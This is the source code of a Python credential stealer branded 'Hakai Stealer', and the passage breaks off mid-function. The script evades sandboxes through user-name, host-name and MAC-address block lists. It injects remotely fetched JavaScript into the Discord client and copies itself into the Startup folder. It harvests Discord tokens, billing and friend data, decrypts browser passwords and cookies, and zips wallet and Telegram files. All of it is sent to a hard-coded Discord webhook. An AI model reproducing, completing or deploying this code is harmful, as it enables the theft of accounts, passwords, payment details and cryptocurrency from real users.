import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
import sys
import shutil
import uuid
import socket
import getpass
os.system('pip install requests')
os.system('pip install Crypto.Cipher')
os.system('pip install pycryptodome')


blacklistUsers = ['WDAGUtilityAccount', '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']

username = getpass.getuser()

if username.lower() in blacklistUsers:
    os._exit(0)

def kontrol():

    blacklistUsername = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']

    hostname = socket.gethostname()

    if any(name in hostname for name in blacklistUsername):
        os._exit(0)

kontrol()

BLACKLIST1 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']

mac_address = uuid.getnode()
if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
    os._exit(0)




wh00k = "https://discord.com/api/webhooks/1103314820662579231/Q1mKdXsdxYj26eMMLkwzq_tCH0WPQnPOL__jx78L1-Gh2I68bLPQKerMYSr3M0CJPcJh"
inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
    
DETECTED = False

def g3t1p():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"],
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def G3tD4t4(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G3tD4t4(blob_out)

def D3kryptV4lU3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413:
                        return r
        except:
            pass

def L04durl1b(wh00k, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(wh00k, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(wh00k, data=data))
                return r
        except: 
            pass

def globalInfo():
    ip = g3t1p()
    us3rn4m1 = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    sehir = ipdata["state"]

    globalinfo = f":flag_{contryCode}:  - `{us3rn4m1.upper()} | {ip} ({contry})`"
    return globalinfo


def TR6st(C00k13):
    # simple Trust Factor system
    global DETECTED
    data = str(C00k13)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def G3tUHQFr13ndS(t0k3n):
    b4dg3List =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        Own3dB3dg4s = ''
        flags = friend['user']['public_flags']
        for b4dg3 in b4dg3List:
            if flags // b4dg3["Value"] != 0 and friend['type'] == 1:
                if not "House" in b4dg3["Name"]:
                    Own3dB3dg4s += b4dg3["Emoji"]
                flags = flags % b4dg3["Value"]
        if Own3dB3dg4s != '':
            uhqlist += f"{Own3dB3dg4s} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


process_list = os.popen('tasklist').readlines()


for process in process_list:
    if "Discord" in process:
        
        pid = int(process.split()[1])
        os.system(f"taskkill /F /PID {pid}")

def G3tb1ll1ng(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        b1ll1ngjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if b1ll1ngjson == []: return "```None```"

    b1ll1ng = ""
    for methode in b1ll1ngjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                b1ll1ng += ":credit_card:"
            elif methode["type"] == 2:
                b1ll1ng += ":parking: "

    return b1ll1ng

def inj_discord():

    username = os.getlogin()

    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']

    for folder_name in folder_list:
        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(deneme_path):
            for subdir, dirs, files in os.walk(deneme_path):
                if 'app-' in subdir:
                    for dir in dirs:
                        if 'modules' in dir:
                            module_path = os.path.join(subdir, dir)
                            for subsubdir, subdirs, subfiles in os.walk(module_path):
                                if 'discord_desktop_core-' in subsubdir:
                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                        if 'discord_desktop_core' in subsubsubdir:
                                            for file in subsubfiles:
                                                if file == 'index.js':
                                                    file_path = os.path.join(subsubsubdir, file)

                                                    inj_content = requests.get(inj_url).text

                                                    inj_content = inj_content.replace("%WEBHOOK%", wh00k)

                                                    with open(file_path, "w", encoding="utf-8") as index_file:
                                                        index_file.write(inj_content)
inj_discord()

def G3tB4dg31(flags):
    if flags == 0: return ''

    Own3dB3dg4s = ''
    b4dg3List =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for b4dg3 in b4dg3List:
        if flags // b4dg3["Value"] != 0:
            Own3dB3dg4s += b4dg3["Emoji"]
            flags = flags % b4dg3["Value"]

    return Own3dB3dg4s

def G3tT0k4n1nf9(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    us3rjs0n = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    us3rn4m1 = us3rjs0n["username"]
    hashtag = us3rjs0n["discriminator"]
    em31l = us3rjs0n["email"]
    idd = us3rjs0n["id"]
    pfp = us3rjs0n["avatar"]
    flags = us3rjs0n["public_flags"]
    n1tr0 = ""
    ph0n3 = ""

    if "premium_type" in us3rjs0n: 
        nitrot = us3rjs0n["premium_type"]
        if nitrot == 1:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122>"
        elif nitrot == 2:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
    if "ph0n3" in us3rjs0n: ph0n3 = f'{us3rjs0n["ph0n3"]}'

    return us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3

def ch1ckT4k1n(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)


def upl05dT4k31(t0k3n, path):
    global wh00k
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)

    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    b1ll1ng = G3tb1ll1ng(t0k3n)
    b4dg3 = G3tB4dg31(flags)
    friends = G3tUHQFr13ndS(t0k3n)
    if friends == '': friends = "```No Rare Friends```"
    if not b1ll1ng:
        b4dg3, ph0n3, b1ll1ng = "🔒", "🔒", "🔒"
    if n1tr0 == '' and b4dg3 == '': n1tr0 = "```None```"

    data = {
        "content": f'{globalInfo()} | `{path}`',
        "embeds": [
            {
            "color": 2895667,
            "fields": [
                {
                    "name": "<a:hyperNOPPERS:828369518199308388> Token:",
                    "value": f"```{t0k3n}```",
                    "inline": True
                },
                {
                    "name": "<:mail:750393870507966486> Email:",
                    "value": f"```{em31l}```",
                    "inline": True
                },
                {
                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
                    "value": f"```{ph0n3}```",
                    "inline": True
                },
                {
                    "name": "<:mc_earth:589630396476555264> IP:",
                    "value": f"```{g3t1p()}```",
                    "inline": True
                },
                {
                    "name": "<:woozyface:874220843528486923> Badges:",
                    "value": f"{n1tr0}{b4dg3}",
                    "inline": True
                },
                {
                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                    "value": f"{b1ll1ng}",
                    "inline": True
                },
                {
                    "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{us3rn4m1}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "Hakai Stealer",
                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
        "username": "Hakai Stealer",
        "attachments": []
        }
    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)

#hersey son defa :(
def R4f0rm3t(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "crcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = R4f0rm3t(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Hakai | Cookies Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [HakaiCookies.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Hakai Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
                    }
                }
            ],
            "username": "Hakai Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return

    if name == "crpassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = R4f0rm3t(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Hakai | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [HakaiPassword.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Hakai Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
                    }
                }
            ],
            "username": "Hakai",
            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                "color": 2895667,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "Hakai | File Stealer"
                },
                "footer": {
                    "text": "Hakai Stealer",
                    "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
                }
                }
            ],
            "username": "Hakai Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return




# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)
    




def wr1tef0rf1l3(data, name):
    path = os.getenv("TEMP") + f"\cr{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Hakai STEALER BEST -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

T0k3ns = ''
def getT0k3n(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for t0k3n in re.findall(regex, line):
                        global T0k3ns
                        if ch1ckT4k1n(t0k3n):
                            if not t0k3n in T0k3ns:
                                # print(token)
                                T0k3ns += t0k3n
                                upl05dT4k31(t0k3n, path)

P4ssw = []
def getP4ssw(path, arg):
    global P4ssw, P4sswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            P4ssw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3kryptV4lU3(row[2], master_key)}")
            P4sswCount += 1
    wr1tef0rf1l3(P4ssw, 'passw')

C00k13 = []    
def getC00k13(path, arg):
    global C00k13, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            C00k13.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3kryptV4lU3(row[2], master_key)}")
            CookiCount += 1
    wr1tef0rf1l3(C00k13, 'cook')

def G3tD1sc0rd(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for t0k3n in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global T0k3ns
                    t0k3nDecoded = D3kryptV4lU3(b64decode(t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)
                    if ch1ckT4k1n(t0k3nDecoded):
                        if not t0k3nDecoded in T0k3ns:
                            # print(token)
                            T0k3ns += t0k3nDecoded
                            # writeforfile(Tokens, 'tokens')
                            upl05dT4k31(t0k3nDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "Hakai Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 2895667,
            "footer": {
                "text": "Hakai Stealer",
                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
            }
            }
        ],
        "username": "Hakai Stealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
        "attachments": []
    }
    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
